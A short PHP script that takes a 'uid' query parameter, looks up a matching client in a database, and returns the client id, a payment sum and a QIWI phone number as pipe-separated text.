<?php
	require_once realpath(dirname(__FILE__)) . '/../utils/db.php';
	
	if(empty($_GET["uid"])) {
		echo "";
		return;
	}
	
	$client = get_client($_GET["uid"]);
	
	if(empty($client)) {
		echo "";
		return;
	}
	
	echo $client[0]["id"] . "|" . PAYMENT_SUM . "|" . QIWI_PHONE;